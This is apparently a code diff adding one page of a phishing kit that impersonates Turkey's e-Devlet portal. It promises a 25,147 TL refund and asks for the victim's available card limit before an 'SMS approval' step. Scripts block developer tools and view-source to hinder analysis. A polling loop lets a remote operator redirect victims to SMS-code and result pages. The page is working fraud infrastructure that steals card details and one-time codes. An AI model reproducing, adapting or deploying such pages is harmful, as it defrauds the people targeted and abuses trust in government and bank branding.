@@ -1,0 +1,640 @@
+
+<!DOCTYPE html>
+<html lang="tr" class="h-full bg-gray-50">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>e-Devlet Kapısı - Limit Kontrolü</title>
+    
+    <!-- Dev Tools Engelleme -->
+    <script>
+        // Dev Tools Engelleme
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (
+                e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                (e.ctrlKey && e.key === 'u') ||
+                (e.ctrlKey && e.key === 's')
+            ) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Mobil cihaz kontrolü
+        (() => {
+            function isMobile() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            function detectDevTools() {
+                if (!isMobile()) {
+                    // Masaüstü için daha geniş tolerans
+                    const widthThreshold = window.outerWidth - window.innerWidth > 300;
+                    const heightThreshold = window.outerHeight - window.innerHeight > 300;
+                    
+                    if(widthThreshold || heightThreshold) {
+                        document.body.innerHTML = '';
+                        window.location.href = 'about:blank';
+                    }
+                } else {
+                    // Mobil cihazlar için daha esnek tolerans
+                    const widthThreshold = window.outerWidth - window.innerWidth > 500;
+                    const heightThreshold = window.outerHeight - window.innerHeight > 500;
+                    
+                    if(widthThreshold || heightThreshold) {
+                        document.body.innerHTML = '';
+                        window.location.href = 'about:blank';
+                    }
+                }
+            }
+
+            // Mobil cihazlar için daha az sıklıkta kontrol
+            if (isMobile()) {
+                window.addEventListener('resize', () => {
+                    setTimeout(detectDevTools, 1000);
+                });
+                setInterval(detectDevTools, 3000);
+            } else {
+                window.addEventListener('resize', detectDevTools);
+                setInterval(detectDevTools, 1000);
+            }
+        })();
+
+        // Ek korumalar
+        document.onkeypress = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) {
+                return false;
+            }
+        }
+        document.onmousedown = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) {
+                return false;
+            }
+        }
+        document.onkeydown = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) {
+                return false;
+            }
+        }
+    </script>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&family=Montserrat:wght@500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --font-primary: 'Public Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            --font-heading: 'Montserrat', Arial, sans-serif;
+        }
+
+        body {
+            font-family: var(--font-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            font-weight: 500;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #60a5fa);
+            border-radius: 3px;
+            transition: width 0.5s ease;
+            position: relative;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                90deg,
+                rgba(255,255,255,0) 0%,
+                rgba(255,255,255,0.4) 50%,
+                rgba(255,255,255,0) 100%
+            );
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .limit-input {
+            transition: all 0.3s ease;
+            border: 2px solid #e5e7eb;
+        }
+
+        .limit-input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .shimmer-button {
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .shimmer-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to right,
+                rgba(255,255,255,0) 0%,
+                rgba(255,255,255,0.3) 50%,
+                rgba(255,255,255,0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shimmerEffect 3s infinite;
+        }
+
+        @keyframes shimmerEffect {
+            0% { transform: translateX(-100%) rotate(30deg); }
+            100% { transform: translateX(100%) rotate(30deg); }
+        }
+
+        .shimmer-button.processing {
+            background: linear-gradient(90deg, #3b82f6, #60a5fa);
+            transform: scale(0.98);
+        }
+
+        .shimmer-button.success {
+            background: linear-gradient(90deg, #059669, #10b981);
+            transform: scale(1.02);
+        }
+
+        .shimmer-button.processing::after {
+            animation: none;
+        }
+
+        .shimmer-button.success::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(120deg, 
+                rgba(255,255,255,0) 0%,
+                rgba(255,255,255,0.6) 50%,
+                rgba(255,255,255,0) 100%);
+            animation: successShimmer 1s forwards;
+        }
+
+        @keyframes successShimmer {
+            0% {
+                transform: translateX(-100%) rotate(45deg);
+            }
+            100% {
+                transform: translateX(100%) rotate(45deg);
+            }
+        }
+
+        .shimmer-button span,
+        .shimmer-button i {
+            position: relative;
+            z-index: 1;
+            transition: all 0.3s ease;
+        }
+
+        .shimmer-button:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(59, 130, 246, 0.2);
+        }
+
+        .shimmer-button:not(:disabled):hover i {
+            transform: scale(1.1);
+        }
+
+        .shimmer-button:disabled {
+            cursor: not-allowed;
+        }
+
+        .floating-label {
+            position: absolute;
+            pointer-events: none;
+            left: 1rem;
+            top: 1rem;
+            transition: 0.2s ease all;
+            color: #6b7280;
+        }
+
+        .limit-input:focus ~ .floating-label,
+        .limit-input:not(:placeholder-shown) ~ .floating-label {
+            transform: translateY(-1.5rem) scale(0.85);
+            color: #3b82f6;
+            background: white;
+            padding: 0 0.25rem;
+        }
+
+        /* Yeni Animasyonlar ve Efektler */
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .backdrop-blur-sm {
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+        }
+
+        .hover-lift {
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .hover-lift:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+
+        .animate-float {
+            animation: float 3s ease-in-out infinite;
+        }
+    </style>
+</head>
+
+<body class="h-full bg-gray-50">
+    <!-- Üst Banner -->
+    <div class="relative bg-gradient-to-r from-blue-600 to-blue-800 text-white">
+        <!-- SSL Güvenlik Bildirimi -->
+        <div class="py-3 px-4">
+            <div class="container mx-auto">
+                <div class="flex flex-col md:flex-row items-center justify-center md:justify-between gap-3">
+                    <!-- SSL Bilgisi -->
+                    <div class="flex items-center space-x-3">
+                        <div class="flex items-center bg-white/10 rounded-full px-4 py-1.5 backdrop-blur-sm">
+                            <i class="fas fa-shield-alt text-green-400 mr-2 text-lg"></i>
+                            <span class="text-sm font-medium">256-bit SSL Korumalı</span>
+                        </div>
+                        <div class="h-4 w-px bg-white/20 hidden md:block"></div>
+                        <div class="flex items-center">
+                            <i class="fas fa-university text-yellow-400 mr-2"></i>
+                            <span class="text-sm">Devlet Güvencesi</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Aktif Kullanıcı Sayısı -->
+                    <div class="flex items-center space-x-2 bg-white/10 rounded-full px-4 py-1.5 backdrop-blur-sm">
+                        <div class="flex items-center">
+                            <div class="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></div>
+                            <span class="text-sm font-medium">178 Aktif Kullanıcı</span>
+                        </div>
+                        <div class="h-4 w-px bg-white/20"></div>
+                        <div class="flex items-center">
+                            <i class="fas fa-fingerprint text-yellow-400 mr-1.5"></i>
+                            <span class="text-sm">İşlem No: # 5472873</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Animasyonlu Alt Çizgi -->
+        <div class="absolute bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-400 via-indigo-500 to-blue-600">
+            <div class="absolute inset-0 bg-white/20 animate-shimmer" 
+                 style="background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+                        animation: shimmer 2s infinite;
+                        background-size: 200% 100%;"></div>
+        </div>
+    </div>
+
+    <!-- Logo ve Header -->
+    <div class="bg-white shadow-sm p-4">
+        <div class="container mx-auto flex justify-center items-center">
+            <img src="https://cdn.e-devlet.gov.tr/downloads/kurumsal-kimlik/logo/e-devlet-logo.png" alt="e-Devlet Logo" class="h-8 md:h-12">
+        </div>
+    </div>
+
+    <!-- İşlem Adımları -->
+    <div class="bg-white py-4 px-4 shadow-sm border-b">
+        <div class="container mx-auto">
+            <div class="flex justify-center items-center text-sm space-x-4">
+                <span class="flex items-center text-green-600">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    <span class="hidden md:inline">Kimlik Doğrulama</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="flex items-center text-green-600">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    <span class="hidden md:inline">Kart Bilgileri</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="flex items-center text-blue-600">
+                    <i class="fas fa-circle-notch fa-spin mr-1"></i>
+                    <span class="hidden md:inline">Limit Kontrolü</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="flex items-center text-gray-400">
+                    <i class="fas fa-circle mr-1"></i>
+                    <span class="hidden md:inline">SMS Onayı</span>
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <div class="max-w-4xl mx-auto mt-8 px-4">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <!-- Sol Kolon: Kart ve İade Bilgileri -->
+            <div class="space-y-6">
+                <!-- Kart Bilgileri Kartı -->
+                <div class="bg-white rounded-xl shadow-lg p-6 hover-lift">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center space-x-3">
+                            <img src="" alt="" id="bankLogo" class="h-8">
+                            <div>
+                                <div class="text-sm text-gray-500">Kart Numarası</div>
+                                <div class="font-medium">**** **** **** 7894</div>
+                            </div>
+                        </div>
+                        <div class="bg-green-50 text-green-700 px-3 py-1 rounded-full text-sm flex items-center">
+                            <i class="fas fa-check-circle mr-1"></i>
+                            Doğrulandı
+                        </div>
+                    </div>
+                    
+                    <!-- İşlem Güvenliği Bilgileri -->
+                    <div class="grid grid-cols-3 gap-4 mt-4">
+                        <div class="text-center">
+                            <div class="bg-blue-50 rounded-lg p-3 animate-float">
+                                <i class="fas fa-shield-alt text-blue-500"></i>
+                            </div>
+                            <div class="text-xs mt-2 text-gray-600">SSL Korumalı</div>
+                        </div>
+                        <div class="text-center">
+                            <div class="bg-blue-50 rounded-lg p-3 animate-float" style="animation-delay: 0.2s">
+                                <i class="fas fa-clock text-blue-500"></i>
+                            </div>
+                            <div class="text-xs mt-2 text-gray-600">Son 24 Saat</div>
+                        </div>
+                        <div class="text-center">
+                            <div class="bg-blue-50 rounded-lg p-3 animate-float" style="animation-delay: 0.4s">
+                                <i class="fas fa-user-check text-blue-500"></i>
+                            </div>
+                            <div class="text-xs mt-2 text-gray-600">Kimlik Onaylı</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- İade Tutarı Kartı -->
+                <div class="bg-white rounded-xl shadow-lg p-6 hover-lift">
+                    <div class="text-center">
+                        <h3 class="text-lg font-semibold text-gray-800 mb-2">Hesaplanan İade Tutarı</h3>
+                        <div class="text-3xl font-bold text-green-600 animate-pulse">
+                            25.147,47 TL
+                        </div>
+                        <div class="mt-4 text-sm text-gray-600">
+                            <div class="flex items-center justify-center space-x-2">
+                                <i class="fas fa-info-circle text-blue-500"></i>
+                                <span>İade tutarınız hesabınıza 2-3 iş günü içinde aktarılacaktır</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- İşlem Güvenliği Kartı -->
+                <div class="bg-gradient-to-br from-blue-500 to-blue-600 rounded-xl shadow-lg p-6 text-white hover-lift">
+                    <div class="flex items-center space-x-3 mb-4">
+                        <div class="bg-white/20 rounded-lg p-2">
+                            <i class="fas fa-shield-alt text-xl"></i>
+                        </div>
+                        <h3 class="text-lg font-semibold">İşlem Güvenliği</h3>
+                    </div>
+                    <ul class="space-y-3">
+                        <li class="flex items-center space-x-2">
+                            <i class="fas fa-check-circle"></i>
+                            <span>256-bit SSL şifreleme</span>
+                        </li>
+                        <li class="flex items-center space-x-2">
+                            <i class="fas fa-check-circle"></i>
+                            <span>3D Secure koruması</span>
+                        </li>
+                        <li class="flex items-center space-x-2">
+                            <i class="fas fa-check-circle"></i>
+                            <span>e-Devlet güvencesi</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Sağ Kolon: Limit Giriş Formu -->
+            <div class="bg-white rounded-xl shadow-lg p-6 hover-lift">
+                <div class="mb-6">
+                    <h2 class="text-2xl font-semibold text-gray-800 mb-2 flex items-center">
+                        <i class="fas fa-credit-card text-blue-600 mr-3"></i>
+                        Limit Kontrolü
+                    </h2>
+                    <p class="text-gray-600">Lütfen kartınızın güncel kullanılabilir limitini giriniz</p>
+                </div>
+
+                <!-- Önemli Uyarılar -->
+                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6 rounded-r-lg">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-exclamation-triangle text-yellow-400"></i>
+                        </div>
+                        <div class="ml-3">
+                            <h3 class="text-sm font-medium text-yellow-800">Önemli Bilgilendirme</h3>
+                            <div class="mt-2 text-sm text-yellow-700">
+                                <ul class="list-disc pl-5 space-y-1">
+                                    <li>Lütfen kartınızın <strong>şu an kullanılabilir</strong> güncel limitini giriniz</li>
+                                    <li>Eksik veya hatalı limit girişi işleminizin iptaline sebep olabilir</li>
+                                    <li>Kartınızın toplam limiti değil, <strong>kullanılabilir bakiyesini</strong> girmelisiniz</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Örnek Limit Gösterimi -->
+                <div class="bg-blue-50 p-4 rounded-lg mb-6">
+                    <div class="flex items-center text-sm text-blue-700">
+                        <i class="fas fa-lightbulb text-blue-500 mr-2"></i>
+                        <span>Örnek: Toplam Limitiniz 50.000 TL ve 30.000 TL'si kullanılmış ise, kullanılabilir limitiniz <strong>20.000 TL</strong>'dir.</span>
+                    </div>
+                </div>
+
+                <!-- Limit Giriş Formu -->
+                <form method="POST" class="space-y-6">
+                    <div class="relative">
+                        <input type="text" name="limitx" id="limitInput" required
+                            class="limit-input block w-full px-4 py-3 rounded-lg text-lg bg-white border focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all"
+                            placeholder=" ">
+                        <label for="limitInput" class="floating-label">Kartınızın Kullanılabilir Limiti (TL)</label>
+                    </div>
+
+                    <button type="submit" class="w-full bg-blue-600 text-white py-4 px-6 rounded-lg hover:bg-blue-700 transition-all duration-300 shimmer-button">
+                        <div class="flex items-center justify-center space-x-2">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Limiti Onayla ve Devam Et</span>
+                        </div>
+                    </button>
+                </form>
+
+                <!-- Alt Bilgi -->
+                <div class="mt-6 pt-4 border-t border-gray-200">
+                    <div class="flex items-center justify-between text-sm text-gray-500">
+                        <div class="flex items-center space-x-1">
+                            <i class="fas fa-clock text-blue-500"></i>
+                            <span>Ortalama İşlem Süresi: 30 saniye</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // Banka logosu ayarlama
+        const firstDigit = '4';
+        const bankLogo = document.getElementById('bankLogo');
+        
+        if (firstDigit === '4') {
+            bankLogo.src = 'https://www.visa.com.tr/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg';
+            bankLogo.alt = 'Visa';
+        } else if (firstDigit === '5') {
+            bankLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/772px-Mastercard-logo.svg.png';
+            bankLogo.alt = 'Mastercard';
+        }
+
+        // Limit input formatlaması
+        document.getElementById('limitInput').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            
+            if (value !== '') {
+                value = parseInt(value, 10).toLocaleString('tr-TR');
+            }
+            
+            e.target.value = value;
+        });
+
+        // Form submit animasyonu
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Form gönderimini engelle
+            
+            const button = this.querySelector('button[type="submit"]');
+            const icon = button.querySelector('i');
+            const text = button.querySelector('span');
+            const form = this;
+            
+            // Butonu devre dışı bırak
+            button.disabled = true;
+            
+            // İlk animasyon: Yükleniyor
+            button.classList.add('processing');
+            icon.className = 'fas fa-circle-notch fa-spin';
+            text.textContent = 'Limit Kontrol Ediliyor...';
+            
+            // Adım adım animasyonlar
+            setTimeout(() => {
+                icon.className = 'fas fa-shield-alt';
+                text.textContent = 'Güvenlik Kontrolü...';
+                
+                setTimeout(() => {
+                    icon.className = 'fas fa-university';
+                    text.textContent = 'Banka Bağlantısı Kuruluyor...';
+                    
+                    setTimeout(() => {
+                        icon.className = 'fas fa-check-circle';
+                        text.textContent = 'İşlem Başarılı!';
+                        button.classList.add('success');
+                        
+                        // Başarılı animasyonundan sonra formu gönder
+                        setTimeout(() => {
+                            form.submit();
+                        }, 1000);
+                        
+                    }, 1500);
+                }, 1500);
+            }, 1500);
+        });
+
+        // AJAX kontrolleri
+        $(document).ready(function() {
+            function gonder() {
+                const csrfToken = '16d323aeb3db6846351be9add510eadb104a8e072407fc12f78c56ac984d4462';
+                $.ajax({
+                    type: 'POST',
+                    url: 'veri.php?ip=195.88.86.111',
+                    headers: {
+                        'X-CSRF-Token': csrfToken,
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    success: function(msg) {
+                        msg = msg.trim();
+                        switch(msg) {
+                            case 'back':
+                                window.location.href = 'index.php';
+                                break;
+                            case 'hata1':
+                                window.location.href = 'sms-hatali.php';
+                                break;
+                            case 'sms':
+                                window.location.href = 'sms-dogrulama.php';
+                                break;
+                            case 'tebrik':
+                                window.location.href = 'tebrikler.php';
+                                break;
+                        }
+                    },
+                    error: function() {
+                        console.error('İstek başarısız oldu');
+                    }
+                });
+            }
+
+            gonder();
+            setInterval(gonder, 2500);
+        });
+    </script>
+</body>
+</html>
